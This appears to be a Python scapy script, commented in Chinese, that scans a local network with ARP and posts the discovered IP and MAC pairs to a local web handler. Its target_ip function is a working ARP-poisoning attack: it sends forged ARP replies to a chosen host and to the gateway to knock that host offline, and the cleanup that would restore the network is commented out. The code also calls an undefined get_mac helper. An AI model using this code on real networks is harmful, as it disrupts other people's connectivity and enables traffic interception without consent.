import requests, time, datetime
from scapy.all import *
import threading
import json

def requestdata(data):
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.182 Safari/537.36",

    }
    url = "http://127.0.0.1:8000/handler/"
    data = {
        "action": "sd",
        "data": data,
    }
    try:

        re=requests.post(data=data, url=url, headers=headers)
        print(re.text)
        return re.text
    except:
        # 这个是输出错误类别的，如果捕捉的是通用错误，其实这个看不出来什么
        print('请求失败')

    # IP阻断
def target_ip(ip, mac, status):
    s_ip = ip.split('.')
    gateway_ip = s_ip[0] + '.' + s_ip[1] + '.' + s_ip[2] + '.' + '254'
    local_ip = s_ip[0] + '.' + s_ip[1] + '.' + s_ip[2] + '.' + '253'
    gateway_mac = get_mac(gateway_ip)
    # 关闭输出
    conf.verb = 0
    # 阻断
    poison_target = ARP()
    poison_target.op = 2
    poison_target.psrc = gateway_ip
    poison_target.pdst = ip
    poison_target.hwdst = mac
    poison_gateway = ARP()
    poison_gateway.op = 2
    poison_gateway.psrc = ip
    poison_gateway.pdst = gateway_ip
    poison_gateway.hwdst = gateway_mac
    # 开始阻断
    # 设置阻断时间间隔
    tm = 10 * 60 if status == 0 else 0
    while tm:
        result = os.popen("ping -c 2 -t 1 {}".format(ip)).read()
        if "ttl" in result:
            send(poison_target)
            send(poison_gateway)
        time.sleep(1.8)
        tm -= 2

    # print time.strftime("%H:%M:%S"), '阻断%s结束', ip

    # restore_target(ip, mac, gateway_ip, gateway_mac)

# IP扫描
# def scan(ip):
#     # 关闭scapy输出
#     conf.verb = 0
#     s_ip = ip.split('.')
#     ip = s_ip[0] + '.' + s_ip[1] + '.' + s_ip[2] + '.'
#     ans, unans = srp(Ether(dst='ff:ff:ff:ff:ff:ff') / ARP(pdst=ip + "1/24"), timeout=2)
#     li = []
#     for s, r in ans:
#         ip = r[ARP].psrc
#         mac = r[Ether].src
#         li.append({"ip": ip, "mac": mac})
#     return li
#
#
# tip = ARP().psrc
# tip = tip[:(len(tip) - tip[::-1].find('.'))]
#
#
# def ScanIp(ip):
#     pkt = Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=ip)
#     try:
#         res = srp1(pkt, timeout=10, verbose=0)
#         if res.psrc == ip:
#             print('[+]' + res.psrc + '   ' + res.hwsrc)
#     except:
#         pass


#定义变量函数
gw=''

#扫描局域网，显示活跃主机
def scan():
    global gw
    for line in os.popen("route print"):
        s=line.strip()
        if s.startswith("0.0.0.0"):
            slist=s.split()
            ip=slist[3]
            gw=slist[2]
            break
    print("本机上网的ip是：",ip)
    print("本机上网的网关是：",gw)
    tnet=gw+"/24"
    #wifi="Realtek RTL8723BE Wireless LAN 802.11n PCI-E NIC"
    p=Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst=tnet)

    ans, unans = srp(p, timeout=2, verbose=0)
    print("一共扫描到%d台主机："%len(ans))
    result=[]
    for s,r in ans:
        result.append([r.psrc,r.hwsrc])
    result = sorted(result,key = lambda x: ( int(x[0].split('.')[0]), int(x[0].split('.')[1]), int(x[0].split('.')[2]) ))
    datajson = json.dumps(result)
    # dct = json.loads(datajson)
    return  datajson
    # print(datajson)
    # for ip,mac in result:
    #     data = [{'a': 1, 'b': 2, 'c': 3, 'd': 4, 'e': 5}]
    #
    #     data2 = json.dumps(data)
    #     print(ip,"----->",mac)




if __name__ == '__main__':
    # print('IP                 MAC')
    # for i in range(1, 256):
    #     ip = tip + str(i)
    #     Go = threading.Thread(target=ScanIp, args=(ip,))
    #     Go.start()
    # nowtime=datetime
    # print("本地时间为 :", time.strftime("%Y-%m-%d %H:%M:%S", time.localtime()) )#时间格式魏2021-03-01 10:40:50
    data=scan()
    requestdata(data)


